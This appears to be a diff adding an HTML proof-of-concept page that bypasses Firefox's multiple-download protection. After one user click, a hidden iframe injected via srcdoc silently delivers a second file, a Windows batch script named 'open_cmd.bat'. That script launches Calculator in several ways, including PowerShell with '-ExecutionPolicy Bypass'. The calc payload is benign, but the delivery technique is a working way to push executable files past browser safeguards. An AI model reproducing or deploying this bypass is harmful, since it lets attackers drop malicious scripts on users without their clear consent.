@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Bypass Multiple Download (Firefox Test)</title>
+    <style>
+        body { font-family: system-ui, sans-serif; max-width: 400px; margin: 40px auto; text-align: center; }
+        button { width: 100%; padding: 12px; background: #0056b3; color: #fff; border: none; border-radius: 4px; cursor: pointer; transition: background 0.2s; }
+        button:hover { background: #004494; }
+        #status { margin-top: 15px; font-size: 14px; color: #555; min-height: 20px; }
+    </style>
+</head>
+<body>
+    <h2>Bypass Multiple Download (Firefox)</h2>
+    <button onclick="run()">Execute Injection</button>
+    <div id="status"></div>
+
+    <script>
+        function download(name, content) {
+            const a = document.createElement('a');
+            const url = URL.createObjectURL(new Blob([content], { type: 'application/octet-stream' }));
+            a.href = url;
+            a.download = name;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            setTimeout(() => URL.revokeObjectURL(url), 1000);
+        }
+
+        let busy = false;
+        function run() {
+            if (busy) return;
+            busy = true;
+            document.getElementById('status').innerText = 'Initializing payload...';
+
+            // 1. Download pertama sebagai pemicu awal (terkait langsung dengan user gesture)
+            download('main_context.txt', 'Firefox multiple download test context');
+
+            setTimeout(() => {
+                // 2. Menggunakan iframe tersembunyi alih-alih window.open
+                // Ini menghindari popup blocker Firefox yang agresif terhadap setTimeout
+                const iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                document.body.appendChild(iframe);
+
+                const batLines = [
+                    '@echo off',
+                    'title Calculator Launcher - Debug (Firefox Test)',
+                    'echo ================================',
+                    'echo  Calculator launch test',
+                    'echo ================================',
+                    'echo.',
+                    'echo [0] Checking calc.exe path...',
+                    'if exist "C:\\Windows\\System32\\calc.exe" (',
+                    '    echo     OK: calc.exe found',
+                    ') else (',
+                    '    echo     FAILED: calc.exe NOT found in System32',
+                    ')',
+                    'echo.',
+                    'echo [1] Launching System32\\calc.exe...',
+                    'start "" "C:\\Windows\\System32\\calc.exe"',
+                    'timeout /t 2 >nul',
+                    'echo.',
+                    'echo [2] Launching calc.exe alias...',
+                    'start "" calc.exe',
+                    'timeout /t 2 >nul',
+                    'echo.',
+                    'echo [3] Launching calculator:// protocol...',
+                    'start "" "calculator://"',
+                    'timeout /t 2 >nul',
+                    'echo.',
+                    'echo [4] Launching UWP AUMID via explorer...',
+                    'explorer.exe "shell:AppsFolder\\Microsoft.WindowsCalculator_8wekyb3d8bbwe!App"',
+                    'timeout /t 2 >nul',
+                    'echo.',
+                    'echo [5] Launching via PowerShell...',
+                    'powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process calc.exe"',
+                    'echo.',
+                    'echo ================================',
+                    'echo  Done. Did the Calculator open?',
+                    'echo  If NOT, take a screenshot of this window.',
+                    'echo ================================',
+                    'pause'
+                ];
+                const batContent = batLines.join('\r\n') + '\r\n';
+
+                // Payload HTML yang akan diinjeksikan ke dalam iframe
+                const htmlContent = `
+                    <!DOCTYPE html>
+                    <html>
+                    <body>
+                        <script>
+                            function download(name, content) {
+                                const a = document.createElement('a');
+                                const url = URL.createObjectURL(new Blob([content], { type: 'application/octet-stream' }));
+                                a.href = url;
+                                a.download = name;
+                                document.body.appendChild(a);
+                                a.click();
+                                document.body.removeChild(a);
+                                setTimeout(() => URL.revokeObjectURL(url), 1000);
+                            }
+                            
+                            const CONTENT = ${JSON.stringify(batContent)};
+                            
+                            setTimeout(() => {
+                                download('open_cmd.bat', CONTENT);
+                                // Feedback ke window utama
+                                if (window.parent && window.parent.document.getElementById('status')) {
+                                    window.parent.document.getElementById('status').innerText = 'Payload delivered via iframe. Check browser download prompts.';
+                                    window.parent.document.getElementById('status').style.color = 'green';
+                                }
+                            }, 300);
+                        <\/script>
+                    </body>
+                    </html>
+                `;
+
+                // srcdoc lebih stabil dan aman di Firefox dibandingkan Blob URL untuk konteks lokal/iframe
+                iframe.srcdoc = htmlContent;
+
+                setTimeout(() => {
+                    busy = false;
+                }, 1000);
+            }, 500);
+        }
+    </script>
+</body>
+</html>
